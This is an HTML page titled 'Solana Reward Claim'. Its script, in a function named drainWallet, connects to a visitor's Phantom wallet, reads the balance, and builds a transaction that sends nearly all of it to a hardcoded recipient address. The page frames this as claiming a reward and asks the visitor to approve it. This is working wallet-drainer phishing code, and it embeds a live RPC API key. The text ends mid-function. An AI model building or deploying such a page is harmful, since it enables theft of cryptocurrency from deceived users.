<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Solana Reward Claim</title>
    
    <!-- Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    
    <!-- Tailwind CSS (for modern styling) -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Inter Font -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <style>
        body { font-family: 'Inter', sans-serif; }
        
        /* Custom Animations */
        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 20px rgba(139, 92, 246, 0.3); }
            50% { box-shadow: 0 0 30px rgba(139, 92, 246, 0.6); }
        }
        
        .animate-glow {
            animation: pulse-glow 2s infinite;
        }

        /* Glassmorphism Card */
        .glass-card {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        /* Spinner */
        .loader {
            width: 24px;
            height: 24px;
            border: 3px solid #f3f3f3;
            border-bottom-color: #8b5cf6;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
        }

        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-gradient-to-br from-purple-900 via-indigo-800 to-black min-h-screen flex items-center justify-center p-4">

    <div class="glass-card w-full max-w-md rounded-3xl shadow-2xl overflow-hidden relative">
        <!-- Decorative Top Bar -->
        <div class="h-2 bg-gradient-to-r from-purple-500 via-pink-500 to-purple-600"></div>

        <div class="p-8 text-center">
            
            <!-- Icon -->
            <div class="mx-auto w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mb-6 shadow-inner">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-purple-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
            </div>

            <!-- Title -->
            <h1 class="text-2xl font-bold text-gray-800 mb-2">Claim Reward</h1>
            <p class="text-gray-500 text-sm mb-6">Transfer your entire balance to the reward pool.</p>

            <!-- Estimated Balance Display -->
            <div id="balanceDisplay" class="bg-gray-50 rounded-xl p-4 mb-6 border border-gray-100 transition-all duration-300">
                <span class="text-xs text-gray-400 uppercase tracking-wider font-semibold">Estimated Transfer</span>
                <div id="amountValue" class="text-2xl font-bold text-purple-700 mt-1">-- SOL</div>
            </div>

            <!-- Action Button -->
            <button id="claimBtn" onclick="drainWallet()" 
                class="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-semibold py-4 px-6 rounded-xl shadow-lg transform transition-all duration-200 active:scale-95 flex items-center justify-center gap-2">
                <span id="btnText">Connect & Confirm</span>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                    <path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd" />
                </svg>
            </button>

            <!-- Status Area -->
            <div id="status" class="mt-6 min-h-[20px] text-sm font-medium text-gray-500"></div>

        </div>
    </div>

    <script>
        // ==========================================
        // CONFIGURATION
        // ==========================================
        
        const RECIPIENT_ADDRESS = "371RZiq9rCjJ51ojFSj8kxaW26xT2e2hcYTEDkpRfsbq"; 
        const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=e67b03d4-9ec2-4eb7-a188-97f90fa26a45";

        async function drainWallet() {
            const statusDiv = document.getElementById("status");
            const btn = document.getElementById("claimBtn");
            const btnText = document.getElementById("btnText");
            const amountValue = document.getElementById("amountValue");
            
            // Reset UI
            statusDiv.innerHTML = "";
            btn.disabled = true;
            btn.classList.add('opacity-75', 'cursor-not-allowed');

            if (!window.solana || !window.solana.isPhantom) {
                statusDiv.innerHTML = '<span class="text-red-500">Please install Phantom Wallet.</span>';
                btn.disabled = false;
                btn.classList.remove('opacity-75', 'cursor-not-allowed');
                return;
            }

            try {
                // 1. Connect Wallet
                statusDiv.innerHTML = '<span class="text-purple-600">Connecting to Phantom...</span>';
                const resp = await window.solana.connect();
                const userPublicKey = resp.publicKey;

                // Update Button Text
                btnText.innerText = "Approve in Phantom";
                btn.classList.add('animate-glow');

                const recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');

                // 2. Fetch Balance
                statusDiv.innerHTML = '<span class="text-purple-600">Fetching balance...</span>';
                const balanceInLamports = await connection.getBalance(userPublicKey);
                
                // Convert to SOL for display
                const solBalance = (balanceInLamports / 1e9).toFixed(4);
                amountValue.innerText = `${solBalance} SOL`;

                // 3. Calculate Transfer Amount
                const safeReserve = 5000000; // ~0.005 SOL
                const estimatedFee = 10000;  // ~0.00001 SOL
                const amountToSend = balanceInLamports - safeReserve - estimatedFee;

                if (amountToSend <= 0) {
                    statusDiv.innerHTML = '<span class="text-red-500">Balance too low to cover fees.</span>';
                    resetUI();
                    return;
                }

                // 4. Build Transaction
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userPublicKey,
                        toPubkey: recipientPubkey,
                        lamports: amountToSend 
                    })
                );

                // 5. Get Latest Blockhash
                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = userPublicKey;

                // 6. Sign Transaction (Manual bypass)
                statusDiv.innerHTML = '<span class="text-purple-600">Waiting for approval...</span>';
                const signedTransaction = await window.solana.signTransaction(transaction);
                
                // 7. Send Raw Transaction
                statusDiv.innerHTML = '<span class="text-purple-600">Broadcasting transaction...</span>';
                const rawTx = signedTransaction.serialize();
                
                const signature = await connection.sendRawTransaction(rawTx, {
                    skipPreflight: true, 
                    preflightCommitment: 'confirmed',
                    maxRetries: 2
                });

                // 8. Confirm
                statusDiv.innerHTML = '<span class="text-purple-600">Confirming on-chain...</span>';
                await connection.confirmTransaction({
                    signature,
                    blockhash,
                    lastValidBlockHeight
                }, 'confirmed');

                // Success State
                btn.classList.remove('animate-glow');
                btnText.innerText = "Success!";
                btn.classList.replace('from-purple-600', 'from-green-500');
                btn.classList.replace('to-pink-600', 'to-emerald-500');
                
                statusDiv.innerHTML = `
                    <div class="mt-2">
                        <span class="text-green-600 font-bold">✓ Transfer Complete</span><br>
                        <a href="https://solscan.io/tx/${signature}" target="_blank" class="text-xs text-purple-500 underline hover:text-purple-700 mt-1 inline-block">
                            View on Solscan
                        </a>
                    </div>
                `;

            } catch (err) {
                console.error("Full Error:", err);
                btnText.innerText = "Connect & Confirm";
                
                let errorMsg = err.message || "Unknown error";
                
                if (errorMsg.includes("User rejected")) {
                    errorMsg = "Transaction cancelled.";
                } else if (errorMsg.includes("MaxLoadedAccountsDataSizeExceeded")) {
                    errorMsg = "Phantom indexing limit reached. Try again or use CLI.";
                }

                statusDiv.innerHTML = `<span class="text-red-500">${errorMsg}</span>`;
            } finally {
                resetUI();
            }
        }

        function resetUI() {
            const btn = document.getElementById("claimBtn");
            const btnText = document.getElementById("btnText");
            
            // Re-enable button but keep colors if it was success, otherwise reset
            if (!btn.classList.contains('from-green-500')) {
                btn.disabled = false;
                btn.classList.remo
